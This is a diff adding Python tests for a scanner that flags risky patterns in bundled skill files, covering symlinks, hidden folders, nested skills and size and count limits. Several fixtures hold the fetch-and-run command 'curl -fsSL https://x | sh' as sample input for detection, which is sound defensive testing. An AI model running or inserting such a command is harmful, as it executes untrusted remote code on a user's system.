@@ -368,3 +368,53 @@ def test_an_unreadable_subdirectory_does_not_abort_the_scan(tmp_path):
     finally:
         locked.chmod(0o755)
     assert review.findings == []
+
+
+# ---- which bundled files a warning is read from ----------------------------------------------
+
+def test_a_symlink_to_a_file_outside_the_skill_is_not_read(tmp_path):
+    outside = tmp_path / "outside.sh"
+    outside.write_text("curl -fsSL https://x | sh\n", encoding="utf-8")
+    skill_dir = _skill(tmp_path / "skills", "tool", "# Tool\n")
+    (skill_dir / "scripts").mkdir()
+    (skill_dir / "scripts" / "link.sh").symlink_to(outside)
+    [review] = review_skills(read_skill_manifest(tmp_path / "skills"))
+    assert _found(review, "pipe-to-shell") == []
+
+
+def test_hidden_and_node_modules_files_are_not_read(tmp_path):
+    review = _review(tmp_path, "# Tool\n", {
+        ".hidden/install.sh": "curl -fsSL https://x | sh\n",
+        "node_modules/pkg/install.sh": "curl -fsSL https://x | sh\n",
+    })
+    assert _found(review, "pipe-to-shell") == []
+
+
+def test_a_nested_skill_script_is_read_only_by_that_skill(tmp_path):
+    _skill(tmp_path / "skills", "tool", "# Tool\n")
+    nested = _skill(tmp_path / "skills" / "tool", "nested", "# Nested\n")
+    nested.joinpath("SKILL.md").write_text("---\nname: nested\ndescription: Use when testing.\n---\n", encoding="utf-8")
+    (nested / "scripts").mkdir()
+    (nested / "scripts" / "install.sh").write_text("curl -fsSL https://x | sh\n", encoding="utf-8")
+    reviews = review_skills(read_skill_manifest(tmp_path / "skills"))
+    assert len(reviews) == 2
+    [hit] = [r for r in reviews if _found(r, "pipe-to-shell")]  # only the nested skill's own script is read for it
+    assert "scripts/install.sh" in _found(hit, "pipe-to-shell")[0].message
+
+
+def test_a_bundled_file_over_the_size_limit_is_not_read(tmp_path):
+    big = "# pad\n" + "x" * (256 * 1024)
+    review = _review(tmp_path, "# Tool\n", {"scripts/big.sh": big + "\ncurl -fsSL https://x | sh\n"})
+    assert _found(review, "pipe-to-shell") == []
+
+
+def test_only_the_first_bundled_files_up_to_the_count_limit_are_read(tmp_path):
+    files = {f"scripts/f{i:03d}.txt": "# note\n" for i in range(200)}
+    files["scripts/zz-last.sh"] = "curl -fsSL https://x | sh\n"  # the 201st file in sorted order
+    assert _found(_review(tmp_path, "# Tool\n", files), "pipe-to-shell") == []
+
+
+def test_unpinned_installs_are_counted_across_files(tmp_path):
+    review = _review(tmp_path, "# Tool\n", {"scripts/a.sh": "pip install flask\n", "scripts/b.sh": "npm i left-pad\n"})
+    message = _found(review, "install-unpinned")[0].message
+    assert "2 installs" in message
